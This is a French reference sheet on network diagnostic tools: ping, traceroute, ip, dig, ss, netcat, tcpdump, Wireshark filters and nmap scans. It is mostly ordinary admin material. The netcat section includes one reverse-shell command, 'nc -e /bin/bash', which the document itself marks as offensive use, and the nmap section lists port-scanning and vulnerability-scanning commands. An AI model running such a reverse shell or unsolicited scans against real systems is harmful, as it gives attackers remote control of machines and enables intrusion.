---
title: "Outils Réseau (Diagnostic et Analyse)"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Networking"
tags: [sciences-appliquées, informatique, sécurité, réseau]
date: "2026-02-22"
---

# Outils Réseau (Diagnostic et Analyse)

## Diagnostic couche 3 (IP)

### ping — test de connectivité ICMP

```bash
ping -c 4 8.8.8.8              # 4 paquets ICMP echo request
ping -i 0.2 10.0.0.1            # intervalle 200ms (stress-test léger)
ping -s 1472 -M do 10.0.0.1     # test MTU (1472 + 28 = 1500)
```

Utilité : vérifier qu'un hôte répond, mesurer la latence (RTT) et le taux de perte. Attention : beaucoup de firewalls bloquent ICMP — pas de réponse ne signifie pas "hôte down".

### traceroute / tracert — chemin réseau

```bash
traceroute -n 8.8.8.8           # Linux (UDP par défaut, -n = pas de DNS)
traceroute -I 8.8.8.8           # ICMP au lieu d'UDP
tracert 8.8.8.8                 # Windows (ICMP par défaut)
mtr 8.8.8.8                     # combinaison ping + traceroute en continu
```

Chaque ligne = un routeur traversé (hop). Les étoiles (`* * *`) signifient soit un filtre ICMP, soit un timeout. `mtr` est plus informatif car il combine les deux en temps réel.

### ip — couteau suisse réseau Linux

```bash
ip addr show                     # interfaces et adresses IP
ip route show                    # table de routage
ip neigh show                    # table ARP (voisins L2)
ip link set eth0 up              # activer une interface
ip addr add 10.0.0.5/24 dev eth0 # ajouter une IP
```

Remplace les anciens `ifconfig`, `route`, `arp` (package net-tools, déprécié).

## Diagnostic DNS

### dig — requêtes DNS détaillées

```bash
dig example.com                  # requête A par défaut
dig example.com MX               # enregistrements mail
dig example.com ANY              # tous les types (souvent bloqué)
dig @1.1.1.1 example.com        # forcer un résolveur
dig +short example.com           # réponse compacte
dig +trace example.com           # résolution itérative complète (root → TLD → auth)
dig -x 8.8.8.8                   # reverse DNS (PTR)
```

`+trace` est indispensable pour débuguer la délégation DNS — il montre exactement à quel niveau la résolution échoue.

### nslookup — rapide mais moins détaillé

```bash
nslookup example.com
nslookup -type=MX example.com
nslookup example.com 8.8.8.8    # forcer un serveur DNS
```

Suffisant pour un check rapide, mais `dig` est préférable pour le diagnostic sérieux (affiche TTL, flags, authority section).

## Diagnostic couche 4 (TCP/UDP)

### ss — sockets actives

```bash
ss -tunlp                        # TCP/UDP, numeric, listening, processes
ss -s                            # statistiques (connexions, états)
ss -t state established          # connexions TCP établies
ss sport = :443                  # filtrer par port source
```

Remplace `netstat`. Plus rapide, lit directement `/proc/net`.

### nc (netcat) — test de port et transfert

```bash
nc -zv 10.0.0.1 22              # test si le port 22 est ouvert
nc -zv 10.0.0.1 20-100          # scan de plage
nc -l 4444                       # écouter sur un port (serveur)
echo "test" | nc 10.0.0.1 4444  # envoyer des données (client)
nc -e /bin/bash 10.0.0.1 4444   # reverse shell (attention : usage offensif)
```

### tcpdump — capture réseau en CLI

```bash
tcpdump -i eth0                  # capturer tout sur eth0
tcpdump -i eth0 port 80          # filtrer par port
tcpdump -i eth0 host 10.0.0.1   # filtrer par hôte
tcpdump -i eth0 -w capture.pcap # sauvegarder en PCAP
tcpdump -r capture.pcap         # relire un PCAP
tcpdump -nn -A port 80           # afficher le payload ASCII (HTTP)
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' # uniquement les SYN
```

Langage de filtre BPF (Berkeley Packet Filter) : puissant mais syntaxe à apprendre.

## Wireshark — analyse graphique

### Filtres d'affichage (display filters)

| Filtre | Ce qu'il montre |
|---|---|
| `http` | Trafic HTTP |
| `tcp.port == 443` | Trafic sur le port 443 |
| `ip.addr == 192.168.1.1` | Tout trafic depuis/vers une IP |
| `dns` | Requêtes et réponses DNS |
| `tcp.flags.syn == 1 && tcp.flags.ack == 0` | SYN initiaux (nouvelles connexions) |
| `http.request.method == "POST"` | Requêtes POST HTTP |
| `frame.len > 1000` | Paquets de plus de 1000 octets |
| `tcp.analysis.retransmission` | Retransmissions TCP (indice de problèmes réseau) |
| `tls.handshake.type == 1` | Client Hello TLS (début handshake) |
| `!(arp or dns or icmp)` | Exclure le bruit courant |

Les filtres d'affichage (barre verte) sont différents des **filtres de capture** (BPF, appliqués en amont). Toujours capturer large et filtrer après.

### Fonctions clés

- **Follow → TCP Stream** : reconstitue une conversation TCP complète (indispensable pour lire du HTTP en clair)
- **Statistics → Protocol Hierarchy** : distribution des protocoles capturés
- **Statistics → Conversations** : top talkers
- **Statistics → IO Graphs** : débit dans le temps
- **Expert Information** : anomalies détectées automatiquement (retransmissions, window full, RST)

### Filtres de capture (BPF)

```
host 10.0.0.1
port 53
tcp port 80
not arp
src net 192.168.1.0/24
```

À appliquer **avant** la capture si le volume est élevé — sinon Wireshark sature.

## Nmap — scanner réseau

Couvert en détail dans `Networking/Softwares/nmap.md`. Rappel des scans essentiels :

```bash
nmap -sn 192.168.1.0/24              # host discovery (ping sweep, pas de port scan)
nmap -sS -p- 10.0.0.1                # SYN scan sur tous les ports (65535)
nmap -sV -sC -p 22,80,443 10.0.0.1   # version + scripts par défaut
nmap -O 10.0.0.1                      # OS fingerprinting
nmap -sU -p 53,161 10.0.0.1           # scan UDP (lent)
nmap --script vuln 10.0.0.1           # scripts de détection de vulnérabilités
nmap -oA scan_results 10.0.0.1        # export dans les 3 formats (nmap, xml, greppable)
```

**Différence SYN vs Connect** : `-sS` (SYN scan) envoie un SYN, attend le SYN-ACK, puis RST — ne complète jamais le handshake (plus discret, nécessite root). `-sT` (connect scan) fait un `connect()` complet (pas besoin de root, mais loggé par le serveur).

## Outils complémentaires

| Outil | Usage |
|---|---|
| `curl` / `wget` | Test HTTP/HTTPS (voir `curl.md`) |
| `openssl s_client` | Inspection certificat TLS, test de connexion SSL |
| `iperf3` | Mesure de bande passante entre deux hôtes |
| `arping` | Ping au niveau ARP (couche 2, même sous-réseau) |
| `hping3` | Craft de paquets TCP/UDP/ICMP (tests firewall, fingerprinting) |
| `whois` | Information sur un domaine ou une IP (registrar, ASN) |
| `host` | Lookup DNS simplifié |
| `ethtool` | Diagnostic couche physique (vitesse, duplex, erreurs) |
